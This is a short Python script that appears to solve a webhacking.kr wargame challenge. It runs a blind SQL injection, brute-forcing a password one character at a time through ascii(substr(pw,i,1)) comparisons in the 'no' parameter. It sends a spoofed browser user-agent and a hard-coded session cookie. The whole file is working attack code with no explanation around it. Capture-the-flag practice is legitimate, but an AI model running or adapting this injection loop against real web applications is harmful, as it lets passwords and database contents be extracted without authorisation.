import urllib.request
from urllib.parse import quote

key = ""
for i in range(1, 20):
    for j in range(32, 127):
        url = "http://webhacking.kr/challenge/bonus/bonus-1/index.php?no="
        data = "2 and ascii(substr(pw,{},1))={}".format(
            str(i),j)
        print(url + data)
        data = quote(data)
        re = urllib.request.Request(url + data)

        re.add_header(
            "User-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36")
        re.add_header(
            "Cookie", "PHPSESSID=146468d32872268defce85d051d198b2"
        )

        req = urllib.request.urlopen(re)

        if str(req.read()).find("True") != -1:
            key += chr(j).lower()
            print(key)
            break
print(key)